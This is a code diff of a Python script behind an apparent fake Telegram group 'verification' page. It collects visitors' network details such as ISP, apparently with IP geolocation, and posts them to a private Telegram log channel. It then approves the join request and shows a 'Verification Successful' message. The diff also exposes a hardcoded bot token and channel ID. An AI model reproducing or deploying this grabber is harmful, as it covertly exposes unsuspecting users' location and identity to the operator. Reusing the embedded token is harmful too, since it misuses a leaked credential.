@@ -3,6 +3,7 @@ import requests
 import os
 from datetime import datetime
 
+# === YOUR DATA ===
 BOT_TOKEN = "8901021055:AAGm6x5-1SY_6v2tNRXBZruygRXt29r8KVI"
 LOG_CHANNEL = "-1002290475903"
 
@@ -40,19 +41,16 @@ ISP: {geo.get('isp', 'Unknown')}
 Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S UTC')}
     """
 
-    requests.post(
-        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-        json={"chat_id": LOG_CHANNEL, "text": log_text, "parse_mode": "HTML"}
-    )
+    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
+                  json={"chat_id": LOG_CHANNEL, "text": log_text, "parse_mode": "HTML"})
 
-    requests.post(
-        f"https://api.telegram.org/bot{BOT_TOKEN}/approveChatJoinRequest",
-        json={"chat_id": chat_id, "user_id": user_id}
-    )
+    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/approveChatJoinRequest",
+                  json={"chat_id": chat_id, "user_id": user_id})
 
+    # SUCCESS PAGE - FULL ENGLISH
     return """
-    <h2 style="text-align:center; margin-top:100px; color:green;">
-        Verification Successful!<br><br>
+    <h2 style="text-align:center; font-family:sans-serif; margin-top:100px; color:green;">
+        Verification Successful<br><br>
         You have been verified and approved to the group.<br>
         Please wait a moment...
     </h2>
